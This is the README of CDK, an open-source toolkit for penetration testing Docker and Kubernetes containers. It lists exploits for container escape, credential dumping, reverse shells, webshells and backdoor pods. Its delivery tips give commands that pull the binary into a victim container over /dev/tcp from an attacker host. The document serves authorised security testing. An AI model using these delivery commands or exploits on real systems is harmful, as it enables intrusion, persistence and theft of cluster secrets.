
# CDK - Zero Dependency Container Penetration Toolkit

English | [简体中文](https://github.com/cdk-team/CDK/wiki/CDK-Home-CN)

![png](https://static.cdxy.me/20201203170308_NwzGiT_Screenshot.jpeg)

## Legal Disclaimer

Usage of CDK for attacking targets without prior mutual consent is illegal.
CDK is for security testing purposes only.

## Overview

CDK is an open-sourced container penetration toolkit, designed for offering stable exploitation in different slimmed containers without any OS dependency. It comes with useful net-tools and many powerful PoCs/EXPs and helps you to escape container and take over K8s cluster easily.

## Installation/Delivery

Download latest release in https://github.com/cdk-team/CDK/releases/

Drop executable files into the target container and start testing.

### TIPS: Deliver CDK into target container in real-world penetration testing

If you have an exploit that can upload a file, then you can upload CDK binary directly.

If you have a RCE exploit, but the target container has no `curl` or `wget`, you can use the following method to deliver CDK:

1. First, host CDK binary on your host with public IP.
```
(on your host)
nc -lvp 999 < cdk
```

2. Inside the victim container execute
```
cat < /dev/tcp/(your_public_host_ip)/(port) > cdk
chmod a+x cdk
```

## Usage
```
Usage:
  cdk evaluate [--full]
  cdk run (--list | <exploit> [<args>...])
  cdk auto-escape <cmd>
  cdk <tool> [<args>...]

Evaluate:
  cdk evaluate                              Gather information to find weakness inside container.
  cdk evaluate --full                       Enable file scan during information gathering.

Exploit:
  cdk run --list                            List all available exploits.
  cdk run <exploit> [<args>...]             Run single exploit, docs in https://github.com/cdk-team/CDK/wiki

Auto Escape:
  cdk auto-escape <cmd>                     Escape container in different ways then let target execute <cmd>.

Tool:
  vi <file>                                 Edit files in container like "vi" command.
  ps                                        Show process information like "ps -ef" command.
  nc [options]                              Create TCP tunnel.
  ifconfig                                  Show network information.
  kcurl <path> (get|post) <uri> <data>      Make request to K8s api-server.
  ectl <endpoint> get <key>                 Unauthorized enumeration of ectd keys.
  ucurl (get|post) <socket> <uri> <data>    Make request to docker unix socket.
  probe <ip> <port> <parallel> <timeout-ms> TCP port scan, example: cdk probe 10.0.1.0-255 80,8080-9443 50 1000

Options:
  -h --help     Show this help msg.
  -v --version  Show version.
```

## Features

CDK has three modules:

1. Evaluate: gather information inside container to find potential weakness.
2. Exploit: for container escaping, persistance and lateral movement
3. Tool: network-tools and APIs for TCP/HTTP requests, tunnels and K8s cluster management.

### Evaluate Module

Usage
```
cdk evaluate [--full]
```
This command will run the scripts below without local file scanning, using `--full` to enable all.

|Tactics|Script|Supported|Usage/Example|
|---|---|---|---|
|Information Gathering|OS Basic Info|✔|[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-System-Info)|
|Information Gathering|Available Capabilities|✔|[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-Commands-and-Capabilities)|
|Information Gathering|Available Linux Commands|✔|[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-Commands-and-Capabilities)|
|Information Gathering|Mounts|✔|[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-Mounts)|
|Information Gathering|Net Namespace|✔|[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-Net-Namespace)|
|Information Gathering|Sensitive ENV|✔|[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-Services)|
|Information Gathering|Sensitive Process|✔|[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-Services)|
|Information Gathering|Sensitive Local Files|✔|[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-Sensitive-Files)|
|Information Gathering|Kube-proxy Route Localnet(CVE-2020-8558)|✔|[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-check-net.ipv4.conf.all.route_localnet)|
|Information Gathering|DNS-Based Service Discovery|✔|[link](https://github.com/kubernetes/dns/blob/master/docs/specification.md)|
|Discovery|K8s Api-server Info|✔|[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-K8s-API-Server)|
|Discovery|K8s Service-account Info|✔|[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-K8s-Service-Account)|
|Discovery|Cloud Provider Metadata API|✔|[link](https://github.com/cdk-team/CDK/wiki/Evaluate:-Cloud-Provider-Metadata-API)|

### Exploit Module

List all available exploits:
```
cdk run --list
```

Run targeted exploit:
```
cdk run <script-name> [options]
```

| Tactic               | Technique                                                  | CDK Exploit Name       | Supported | In Thin                                                                    | Doc                                                                                  |
|----------------------|------------------------------------------------------------|------------------------|-----------|----------------------------------------------------------------------------|--------------------------------------------------------------------------------------|
| Escaping             | docker-runc CVE-2019-5736                                  | runc-pwn               | ✔         | ✔                                                                          ||
| Escaping             | containerd-shim CVE-2020-15257                             | shim-pwn               | ✔         || [link](https://github.com/cdk-team/CDK/wiki/Exploit:-shim-pwn)             |
| Escaping             | docker.sock PoC (DIND attack)                              | docker-sock-check      | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-docker-sock-check)              |
| Escaping             | docker.sock RCE                                            | docker-sock-pwn        | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-docker-sock-pwn)                |
| Escaping             | Docker API(2375) RCE                                       | docker-api-pwn         | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-docker-api-pwn)                 |
| Escaping             | Device Mount Escaping                                      | mount-disk             | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-mount-disk)                     |
| Escaping             | LXCFS Escaping                                             | lxcfs-rw               | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-lxcfs-rw)                       |
| Escaping             | Cgroups Escaping                                           | mount-cgroup           | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-mount-cgroup)                   |
| Escaping             | Abuse Unprivileged User Namespace Escaping  CVE-2022-0492  | abuse-unpriv-userns    | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-abuse-unpriv-userns)            |
| Escaping             | Procfs Escaping                                            | mount-procfs           | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-mount-procfs)                   |
| Escaping             | Ptrace Escaping PoC                                        | check-ptrace           | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-check-ptrace)                   |
| Escaping             | Rewrite Cgroup(devices.allow)                              | rewrite-cgroup-devices | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-rewrite-cgroup-devices)         |
| Escaping             | Read arbitrary file from host system (CAP_DAC_READ_SEARCH) | cap-dac-read-search    | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-cap-dac-read-search)            |
| Discovery            | K8s Component Probe                                        | service-probe          | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-service-probe)                  |
| Discovery            | Dump Istio Sidecar Meta                                    | istio-check            | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-check-istio)                    |
| Discovery            | Dump K8s Pod Security Policies                             | k8s-psp-dump           | ✔         || [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-psp-dump)         |
| Remote Control       | Reverse Shell                                              | reverse-shell          | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-reverse-shell)                  |
| Credential Access    | Registry BruteForce                                        | registry-brute         | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-Container-Image-Registry-Brute) |
| Credential Access    | Access Key Scanning                                        | ak-leakage             | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-ak-leakage)                     |
| Credential Access    | Etcd Get K8s Token                                         | etcd-get-k8s-token     | ✔         | ✔                                                                          |                |
| Credential Access    | Dump K8s Secrets                                           | k8s-secret-dump        | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-secret-dump)                |
| Credential Access    | Dump K8s Config                                            | k8s-configmap-dump     | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-configmap-dump)             |
| Privilege Escalation | K8s RBAC Bypass                                            | k8s-get-sa-token       | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-get-sa-token)               |
| Persistence          | Deploy WebShell                                            | webshell-deploy        | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-webshell-deploy)                |
| Persistence          | Deploy Backdoor Pod                                        | k8s-backdoor-daemonset | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-backdoor-daemonset)         |
| Persistence          | Deploy Shadow K8s api-server                               | k8s-shadow-apiserver   | ✔         || [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-shadow-apiserver) |
| Persistence          | K8s MITM Attack (CVE-2020-8554)                            | k8s-mitm-clusterip     | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Evaluate:-k8s-mitm-clusterip)            |
| Persistence          | Deploy K8s CronJob                                         | k8s-cronjob            | ✔         | ✔                                                                          | [link](https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-cronjob)                    |

**Note about Thin:** The **thin release** is prepared for short life container shells such as serverless functions. We add build tags in source code and cut a few exploits to get the binary lighter. The 2MB file contains 90% of CDK functions, also you can pick up useful exploits in CDK source code to build your own lightweight binary.

### Tool Module

Running commands like in Linux, little different in input-args, see the usage link.
```
cdk nc [options]
cdk ps
```

|Command|Description|Supported|Usage/Example|
|---|---|---|---|
|nc|TCP Tunnel|✔|[link](https://github.com/cdk-team/CDK/wiki/Tool:-nc)|
|ps|Process Information|✔|[link](https://github.com/cdk-team/CDK/wiki/Tool:-ps)|
|ifconfig|Network Information|✔|[link](https://github.com/cdk-team/CDK/wiki/Tool:-ifconfig)|
|vi|Edit Files|✔|[link](https://github.com/cdk-team/CDK/wiki/Tool:-vi)|
|ectl|Unauthorized enumeration of ectd keys|✔||
|kcurl|Request to K8s api-server|✔|[link](https://github.com/cdk-team/CDK/wiki/Tool:-kcurl)|
|dcurl|Request to Docker HTTP API|✔|[link](https://github.com/cdk-team/CDK/wiki/Tool:-dcurl)|
|ucurl|Request to Docker Unix Socket|✔|[link](https://github.com/cdk-team/CDK/wiki/Tool:-ucurl)|
|rcurl|Request to Docker Registry API|||
|probe|IP/Port Scanning|✔|[link](https://github.com/cdk-team/CDK/wiki/Tool:-probe)|

### Release Document

If you want to know how we released a new version, how thin is produced, why we provide upx versions, what the differences between different versions about all, normal, thin, upx are, and how to choose specific CDK exploits and tools to compile an own release for yourself, please check the [Release Document](https://github.com/cdk-team/CDK/wiki/Release).

## Developer Docs

* [run test in container.](https://github.com/cdk-team/CDK/wiki/Run-Test)

## Contributing to CDK

First off, thanks for taking the time to contribute!

Thanks for the following contributors:

<a href="https://github.com/cdk-team/cdk/graphs/contributors">
  <img src="https://contrib.rocks/image?repo=cdk-team/cdk" />
</a>

More contributors：[Contributors List](thanks.md)

#### Bug Reporting

Bugs are tracked as [GitHub Issues](https://github.com/cdk-team/CDK/issues). Create an issue with the current CDK version, error msg and the environment. Describe the exact steps which reproduce the problem.

#### Suggesting Enhancements

Enhancement suggestions are tracked as [GitHub Discussions](https://github.com/cdk-team/CDK/discussions). You can publish any thoughts here to discuss with developers directly.

#### Pull Requests

Fix problems or maintain CDK's quality:

* Describe the current CDK version, environment, problem and exact steps that reproduce the problem.
* Running screenshots or logs before and after you fix the problem.

New feature or exploits:

* Explain why this enhancement would be useful to other users.
* Please enable a sustainable environment for us to review contributions.
* Screenshots about how this new feature works.
* If you are committing a new evaluate/exploit scripts, please add a simple doc to your PR message, here is an [example](https://github.com/cdk-team/CDK/wiki/Exploit:-docker-sock-deploy).

## Events

### 404StarLink 2.0 - Galaxy
![png](https://github.com/knownsec/404StarLink-Project/raw/master/logo.png)

Project CDK is now included in 404Team [Starlink Project 2.0](https://github.com/knownsec/404StarLink2.0-Galaxy). Join the StarLink community to get in touch with CDK dev-team.

- [https://github.com/knownsec/404StarLink2.0-Galaxy#community](https://github.com/knownsec/404StarLink2.0-Galaxy#community)

### BlackHat Asia 2021 Arsenal

- [https://www.blackhat.com/asia-21/arsenal/schedule/index.html#cdk-zero-dependency-container-penetration-toolkit-22422](https://www.blackhat.com/asia-21/arsenal/schedule/index.html#cdk-zero-dependency-container-penetration-toolkit-22422)

### HITB SecConf 2021 Amsterdam

- [Briefing: "Attack Cloud Native Kubernetes"](https://conference.hitb.org/hitbsecconf2021ams/sessions/attacking-cloud-native-kubernetes-with-cdk/)


### WHC 2021 (补天白帽大会)

- [CDK: Also a Awesome BugBounty Tool for Cloud Platform](https://github.com/neargle/slidefiles/blob/main/2021%20WHC2021%20CDK-Also-a-Awesome-BugBounty-Tool-for-Cloud-Platform.pptx.pdf)

### KCON 2021 Arsenal

- [http://kcon.knownsec.com/2021/#/arsenal](http://kcon.knownsec.com/2021/#/arsenal)

### Kubernetes community Days 2021 

- [https://community.cncf.io/events/details/cncf-kcd-china-presents-kubernetes-community-days-china/](https://community.cncf.io/events/details/cncf-kcd-china-presents-kubernetes-community-days-china/)

